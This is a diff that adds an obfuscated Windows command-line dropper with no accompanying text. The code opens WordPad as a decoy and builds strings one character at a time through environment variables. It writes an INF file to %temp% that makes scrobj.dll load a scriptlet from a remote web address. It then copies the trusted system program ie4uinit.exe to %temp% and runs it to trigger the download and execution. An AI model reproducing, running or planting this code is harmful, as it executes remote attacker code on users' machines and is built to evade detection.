@@ -1,0 +1,20 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %w in ("itinerarye=l" "monocha=s" "nellaxi=c" "uroede=e" "dishwi=t" ) do @set %~w) &&
+  callcall(for %s in ("n") do @set "quirkishe=%~s") &&
+  (for %l in ("l") do @set "misdiv=%~l") &&
+  (for %w in ("o") do @set "descryi=%~w") &&
+  callcallcallcallcall(for %a in ("_") do @set "guardia=%~a") &&
+  callcall(for %g in ("4") do @set "paeo=%~g") &&
+  callcallcall(for %b in ("]") do @set "pyoptysisco=%~b") &&
+  call(for %y in ("e") do @set "exrxc=%~y") &&
+  (for %o in ("s") do @set "molecular=%~o") &&
+  callcallcallcall(for %n in (".") do @set "twofo=%~n") &&
+  call(for %x in ("l") do @set "misdiv=%~x") &&
+  call(for %t in ("p") do @set "apomictical=%~t") &&
+  call(for %c in ("C") do @set "vermiculit=%~c") &&
+  callcallcall(for %d in ("1") do @set "perilou=%~d") &&
+  callcallcall(for %f in ("e") do @set "exrxc=%~f") &&
+  (for %e in ("t") do @set "coales=%~e") &&
+  call(for %w in ("8") do @set "glo=%~w") &&
+  (for %r in ("[defaultinstall.windows7]" "delfiles=24B14" "Un\" "Register\" "OCXs=fyc_4368" "[24B14]" "i%amollishd%u%vangue%n%vangue%t%rachiti%i%steamf%f" "[fyc_4368]" "s%transit%r%incorp%b\" "j%rachiti%d%inhum%l,N%casementedn%,%dainti%t%buttressl%p%tam%/%heir%s%aconi%g%antichlori%d%rachiti%s%incorp%p%dainti%i%antichlori%-%triactin%a%aconi%c%antichlori%l%rachiti%c%incorp%m%heir%r%incorp%c%protest%a%steamf%d%meconid%o%inhum%l" "[destinationdirs]" "defaultdestdir=11" "24B14=01" "[version]" "signature=$windows nt$" "[strings]" "servicename= 'poliadverr'" "shortsvcname= 'poliadverr'" "rachiti=." "heir=/" "tam=:" "casementedn=I" "antichlori=a" "transit=c" "amollishd=e" "dainti=h" "vangue=i" "protest=k" "inhum=l" "steamf=n" "incorp=o" "triactin=p" "meconid=r" "aconi=s" "buttressl=t" ) do @echo %~r) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
